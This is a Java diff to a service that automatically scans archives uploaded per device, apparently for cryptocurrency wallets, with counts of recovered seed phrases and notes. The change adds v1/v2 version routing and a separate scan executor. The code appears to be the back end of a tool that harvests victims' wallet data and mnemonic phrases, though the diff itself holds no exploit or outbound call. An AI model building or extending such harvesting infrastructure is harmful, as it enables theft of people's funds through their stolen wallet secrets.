@@ -32,6 +32,7 @@ import com.consumer.parse.TrustWallet;
 import com.consumer.parse.WalletDisplay;
 import com.consumer.parse.WalletMatcher;
 import com.consumer.util.UploadPaths;
+import com.consumer.worker.ConsumerLane;
 
 import lombok.RequiredArgsConstructor;
 import lombok.extern.slf4j.Slf4j;
@@ -55,7 +56,29 @@ public class DeviceAutoParseService {
     @Resource(name = "archiveScanExecutor")
     private ExecutorService archiveScanExecutor;
 
+    @Resource(name = "archiveScanExecutorV1")
+    private ExecutorService archiveScanExecutorV1;
+
     public Map<String, Object> autoParseV2(String deviceId) {
+        return autoParse(deviceId, "v2", true);
+    }
+
+    public Map<String, Object> autoParse(String deviceId, String metaVer) {
+        String did = StringUtils.trimToEmpty(deviceId);
+        DeviceEntity device = did.isEmpty() ? null : findDevice(did);
+        String dbVer = device == null ? "" : StringUtils.trimToEmpty(device.getInterversion());
+        String ver = StringUtils.isNotBlank(dbVer) ? dbVer : StringUtils.defaultIfBlank(metaVer, "v1");
+        if ("v2".equalsIgnoreCase(ver) && ConsumerLane.isV1()) {
+            Map<String, Object> out = new LinkedHashMap<>();
+            out.put("ok", true);
+            out.put("device_id", device == null ? did : device.getDeviceId());
+            out.put("interversion", "v2");
+            return out;
+        }
+        return autoParse(deviceId, ver, "v2".equalsIgnoreCase(ver));
+    }
+
+    private Map<String, Object> autoParse(String deviceId, String version, boolean forceV2) {
         Map<String, Object> out = new LinkedHashMap<>();
         String did = StringUtils.trimToEmpty(deviceId);
         if (did.isEmpty()) {
@@ -71,16 +94,17 @@ public class DeviceAutoParseService {
             return out;
         }
         did = device.getDeviceId();
-        if (!"v2".equalsIgnoreCase(StringUtils.trimToEmpty(device.getInterversion()))) {
+        if (forceV2 && !"v2".equalsIgnoreCase(StringUtils.trimToEmpty(device.getInterversion()))) {
             device.setInterversion("v2");
             deviceDao.updateById(device);
         }
+        String ver = StringUtils.defaultIfBlank(StringUtils.trimToEmpty(device.getInterversion()), version);
         List<UploadFileEntity> uploads = uploadFileDao.selectList(new QueryWrapper<UploadFileEntity>()
                 .eq("deviceId", did)
                 .orderByDesc("created_at")
                 .orderByDesc("id"));
         long tScan = System.currentTimeMillis();
-        List<WalletDisplay> displays = scanV2(did, uploads);
+        List<WalletDisplay> displays = scan(did, uploads, forceV2);
         long scanMs = System.currentTimeMillis() - tScan;
         long tPersist = System.currentTimeMillis();
         Map<String, Object> stats = persist(did, device.getAppId(), displays);
@@ -105,6 +129,7 @@ public class DeviceAutoParseService {
 //                stats.get("mnemonic_added"), stats.get("note_added"), hasNotes, scanMs, persistMs);
         out.put("ok", true);
         out.put("device_id", did);
+        out.put("interversion", ver);
         out.put("upload_count", uploads.size());
         out.put("wallet_count", displays.size());
         out.put("phrase_count", phraseN);
@@ -115,7 +140,7 @@ public class DeviceAutoParseService {
         return out;
     }
 
-    private List<WalletDisplay> scanV2(String did, List<UploadFileEntity> uploads) {
+    private List<WalletDisplay> scan(String did, List<UploadFileEntity> uploads, boolean v2Only) {
         List<ScanJob> jobs = new ArrayList<>();
         Set<String> seen = new LinkedHashSet<>();
         Set<String> seenCanon = new LinkedHashSet<>();
@@ -124,10 +149,10 @@ public class DeviceAutoParseService {
             if (fname.isEmpty() || seen.contains(fname) || !WalletMatcher.isArchive(fname)) {
                 continue;
             }
-            if (u.getFileSize() != null && u.getFileSize() <= 0) {
+            if (v2Only && u.getFileSize() != null && u.getFileSize() <= 0) {
                 continue;
             }
-            if (!WalletMatcher.isCoreExportName(fname) && WalletMatcher.classifyV2(fname) == null) {
+            if (v2Only && !WalletMatcher.isCoreExportName(fname) && WalletMatcher.classifyV2(fname) == null) {
                 continue;
             }
             Path path = UploadPaths.resolveDiskPath(props.getUploadDir(), u.getDiskPath());
@@ -146,7 +171,7 @@ public class DeviceAutoParseService {
             if (fname.isEmpty() || seen.contains(fname) || !WalletMatcher.isArchive(fname)) {
                 continue;
             }
-            if (!WalletMatcher.isCoreExportName(fname) && WalletMatcher.classifyV2(fname) == null) {
+            if (v2Only && !WalletMatcher.isCoreExportName(fname) && WalletMatcher.classifyV2(fname) == null) {
                 continue;
             }
             log.info("【scan】archive(disk) device={} file={} disk={}", did, fname, p.toAbsolutePath());
@@ -373,7 +398,7 @@ public class DeviceAutoParseService {
     }
 
     private <T> CompletableFuture<T> submitScan(Supplier<T> work, T fallback) {
-        ExecutorService exec = archiveScanExecutor;
+        ExecutorService exec = ConsumerLane.isV1() ? archiveScanExecutorV1 : archiveScanExecutor;
         if (exec == null) {
             try {
                 return CompletableFuture.completedFuture(work.get());
